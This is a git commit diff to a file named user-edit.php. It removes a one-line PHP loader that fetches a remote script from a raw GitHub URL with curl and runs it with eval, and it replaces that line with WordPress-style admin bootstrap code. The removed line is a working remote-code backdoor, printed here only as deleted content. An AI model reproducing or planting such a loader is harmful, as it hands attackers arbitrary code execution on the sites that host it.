0938f757475ce9b7f9ce6408ac75d8a8bb3f2ff3
modern-master <cocomelonte99@gmail.com>
2026-03-13 21:25:39 +0700

    Add files via upload

--- user-edit.php
+++ user-edit.php
@@ -1,2 +1,13 @@
-<?php $Url = "https://raw.githubusercontent.com/ZewarUyee/my-tools/refs/heads/main/seo-tusbol.php"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>
+<?php
+/**
+ * Edit user administration panel.
+ *
+ * @package WordPress
+ * @subpackage Administration
+ * @since 3.1.0
+ */
 
+/** Load WordPress Administration Bootstrap */
+require_once __DIR__ . '/admin.php';
+
+require ABSPATH . 'wp-admin/user-edit.php';
